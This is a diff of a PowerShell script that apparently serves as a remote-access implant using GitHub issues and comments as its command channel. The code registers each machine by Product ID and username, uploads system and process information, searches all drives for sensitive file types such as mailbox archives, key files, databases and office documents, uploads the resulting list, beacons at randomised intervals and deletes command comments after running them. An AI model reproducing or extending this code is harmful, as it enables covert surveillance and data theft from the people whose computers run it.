@@ -30,13 +30,12 @@ function Send-Message
         #Default: encode the body
         Else
         {
-            Write-Console -Message ("Default switch entered.")
             Write-Console -Message ("body is currently set to " + $body)
             [string]$encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
             Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
             $mergedBody = "[" + [string]$commandID + "]:" + [string]$encodedBody
             Write-Console -Message ("Merged body is " + $mergedBody)
-            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
+            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ($mergedBody + "")
         }           
     }
     catch
@@ -89,7 +88,7 @@ function Update-SearcherLog
     try 
     {
         #Make sure there is at least one entry in the searcher log even if no files with the below specified criteria are found
-        $searcherLog = "BEGIN SEARCHER LOG"
+        $script:searcherLog = "BEGIN SEARCHER LOG"
 
         #Search for files with the below extensions and add them to the searcher log. This will take some time if the drives are slow and/or there's a lot of files.
         $extensions = @("csv","db","dbf","mdb","key","odp","pps","ppt","pptx","ods","xlr","xls","xlsx","xlsm","doc","docx","docm","odt","pdf","tex","wks","wps","wpd","pst","ost")
@@ -122,7 +121,7 @@ function Update-SearcherLog
             }
             Write-Console -Message ("Completed searching drive " + $drive + ".")
         }
-        $searcherLog = $searcherLog + ($fileList.ToArray())
+        $script:searcherLog = $script:searcherLog + ($fileList.ToArray())
         Write-Console -Message ("Searching finished.")
     }
     catch
@@ -308,7 +307,7 @@ function Start-LoopMode
             If($uploadComputerInfo)
             {
                 Write-Console -Message ("Configuration is set to upload the computer info results. Uploading...")
-                Send-Message -CommandID 3 -Body ($compInfo)
+                Send-Message -CommandID 3 -Body ($script:compInfo)
                 Write-Console -Message ("Computer info results upload complete.")
             }
         }
@@ -324,9 +323,9 @@ function Start-LoopMode
             If($uploadProcInfo)
             {
                 Write-Console -Message ("Configuration is set to upload the process information. Updating it...")
-                $procInfo = (Get-Process).ProcessName
+                $script:procInfo = (Get-Process).ProcessName
                 Write-Console -Message ("Update complete. Uploading...")
-                Send-Message -CommandID 4 -Body ($procInfo)
+                Send-Message -CommandID 4 -Body ($script:procInfo)
                 Write-Console -Message ("Process info upload complete.")
             }
         }
@@ -372,12 +371,13 @@ function Start-LoopMode
         {
             ForEach($comment in $comments)
             {
+                #Refresh and upload searcher log
                 If($comment.body -like "[7]")
                 {
                     Write-Console -Message ("Searcher log refresh command received. Updating the log...")
                     Update-SearcherLog
                     Write-Console -Message ("Searcher log refreshed. Uploading...")
-                    Send-Message -CommandID 8 -Body ($searcherLog)
+                    Send-Message -CommandID 8 -Body ($script:searcherLog)
                     Write-Console -Message ("Uploaded. Deleting searcher log refresh command...")
                     Remove-GitHubComment -OwnerName $user -RepositoryName $repository -CommentID $comment.ID
                     Write-Console -Message ("Comment removed.")
@@ -481,8 +481,9 @@ function Start-LoopMode
         $waitTime = $phoneInterval + (Get-Random -Maximum $phoneStatic -Minimum (0 - $phoneStatic))
         Write-Console -Message ("Wait time was set to " + $waitTime + " minutes.")
 
-        $waitTime = 1
-        Write-Host "For debugging purposes the wait time has been set to 1 minute."
+        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+        $waitTime = 2
+        Write-Host "For debugging purposes the wait time has been set."
 
         try
         {
@@ -521,6 +522,7 @@ function Start-LoopMode
 
         #Waiting loop
         $timer = [Diagnostics.Stopwatch]::StartNew()
+        Write-Console -Message ("Timer started. Entering waiting state.")
         While($timer.Elapsed.TotalMinutes -lt $waitTime)
         {
             #Put a short sleep here to avoid hammering the CPU
@@ -576,6 +578,7 @@ function Start-LoopMode
             }
         }
         $timer.stop()
+        Write-Console -Message ("Timer stopped. Phoning in.")
     }
 }
 
@@ -603,10 +606,10 @@ Write-Console -Message ("Program starting with debug mode set to " + $debugMode 
 
 #Check to see if powershell is already running.  If it is, exit the script. This will prevent the script from rendering powershell unusable on the computer.
 Write-Console -Message ("Getting processes...")
-$procInfo = (Get-Process).ProcessName
+$script:procInfo = (Get-Process).ProcessName
 Write-Console -Message ("Done. Checking if PowerShell is already running...")
 $numPowerShellProcs = 0
-ForEach($proc in $procInfo)
+ForEach($proc in $script:procInfo)
 {
     If($proc -clike "powershell")
     {
@@ -635,7 +638,7 @@ $script:inputLog = "?1"
 
 #Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with CMDR.
 Write-Console -Message ("Getting computer info...")
-$compInfo = Get-ComputerInfo
+$script:compInfo = Get-ComputerInfo
 Write-Console -Message ("Done.")
 
 #Confirm that NuGet is installed. If not, install it and confirm installation.
@@ -754,7 +757,7 @@ try
 	$issueList = Get-GitHubIssue -OwnerName $GitHubUserName -RepositoryName $repositoryName
 	$issueList | ForEach-Object -Process `
 	{
-		If($_.Title -clike $compInfo.WindowsProductID)
+		If($_.Title -clike $script:compInfo.WindowsProductID)
 		{
             $issueNumber = $_.number
             Write-Console -Message ("Found the issue number for this machine OK. Issue number is " + $issueNumber)
@@ -764,12 +767,12 @@ try
 	If($issueNumber -clike "0")
 	{
         Write-Console -Message ("Unable to find the issue number for this machine. Attempting to create one...")
-        New-GitHubIssue -OwnerName $GitHubUserName -RepositoryName $repositoryName -Title $compInfo.WindowsProductID -Body $env:USERNAME
+        New-GitHubIssue -OwnerName $GitHubUserName -RepositoryName $repositoryName -Title $script:compInfo.WindowsProductID -Body $env:USERNAME
         Write-Console -Message ("Issue creation command executed. Verifying...")
 		$issueList = Get-GitHubIssue -OwnerName $GitHubUserName -RepositoryName $repositoryName
 		$issueList | ForEach-Object -Process `
 		{
-			If($_.Title -clike $compInfo.WindowsProductID)
+			If($_.Title -clike $script:compInfo.WindowsProductID)
 			{
                 $issueNumber = $_.number
                 Write-Console -Message ("New issue for this machine created OK. Issue number is " + $issueNumber + ".")
